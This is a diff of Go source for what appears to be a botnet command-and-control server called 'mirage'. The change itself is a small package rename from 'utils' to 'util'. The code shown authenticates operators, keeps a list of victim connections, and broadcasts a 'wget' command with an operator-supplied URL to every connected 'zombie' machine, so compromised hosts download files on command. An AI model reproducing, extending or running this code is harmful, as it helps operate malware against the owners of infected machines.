@@ -4,7 +4,7 @@ import (
 	"bufio"
 	"fmt"
 	"mirage/global"
-	"mirage/utils"
+	"mirage/util"
 	"net"
 	"strings"
 )
@@ -43,8 +43,8 @@ func handleLogin(conn *net.Conn) {
 
 		value, isInsideMap := global.Users_cred[username]
 		if isInsideMap && value == password {
-			utils.ClearScreen(conn)
-			(*conn).Write([]byte(utils.ReturnBanner(username)))
+			util.ClearScreen(conn)
+			(*conn).Write([]byte(util.ReturnBanner(username)))
 			handleCommand(conn)
 		} else {
 			(*conn).Write([]byte("[Error] Wrong Username/Password.\r\n"))
@@ -54,7 +54,7 @@ func handleLogin(conn *net.Conn) {
 
 func handleCommand(conn *net.Conn) {
 	for {
-		if !utils.Contains(global.VictimsConnection, conn) {
+		if !util.Contains(global.VictimsConnection, conn) {
 			(*conn).Write([]byte("\033[31;97m)―――▶ "))
 			cmd, _ := bufio.NewReader(*conn).ReadString('\n')
 
@@ -65,7 +65,7 @@ func handleCommand(conn *net.Conn) {
 					(*zombieConn).Write([]byte(fmt.Sprintf("%s %s", "wget", cmd[9:len(cmd)-2])))
 				}
 			} else if strings.Compare(cmd, "clear\r\n") == 0 {
-				utils.ClearScreen(conn)
+				util.ClearScreen(conn)
 			} else {
 				(*conn).Write([]byte("Command not found.\r\n"))
 			}
